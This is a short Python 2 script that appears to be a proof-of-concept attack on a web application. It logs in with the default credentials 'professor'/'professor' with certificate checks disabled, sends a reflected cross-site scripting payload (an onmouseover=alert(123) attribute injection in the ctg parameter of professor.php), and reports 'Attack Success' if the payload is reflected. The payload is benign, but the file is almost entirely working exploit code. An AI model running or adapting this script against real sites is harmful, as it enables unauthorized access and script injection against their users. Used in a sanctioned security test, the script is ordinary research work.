import requests
from requests import Request, Session
import urllib, urllib2

defaultHeader = {
    "Referer": "https://app4.com/www/index.php",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
}


def self_checkIfCanLogin(s,payload, loginurl, header):
    response = s.post(loginurl, data=payload, headers=header, verify=False)
    content = response.content.lower().replace(" ", "")
    #print content
    if ("logout" in content) and (response.status_code == 200):
        print 'login success'
        return True
    if "session expired" in content:
        print 'f'
        return False
    for param in payload:
        print param
        if ("name='" + str(param) + "'" in content) or ('name="' + str(param) + '"' in content):
            return False
    return True


with requests.Session() as s:
    self_checkIfCanLogin(s,{"login": "professor", "password": "professor", "_qf__login_form": "123"},
                         'https://app5.com/www/index.php', defaultHeader)
    #attacking!
    r = s.get("https://app5.com/www/professor.php?ctg=%22%20onmouseover=%22alert%28123%29&user=professor&op=profile",verify=False)
    f2 = open('tmp04.html', 'w')
    f2.write(r.text.encode('utf-8'))
    IsAttackSucces=r.text.encode('utf-8').find('alert(123)')
    print IsAttackSucces
    if(IsAttackSucces>0):
        print 'Attack Success'
    else:
        print 'Failed'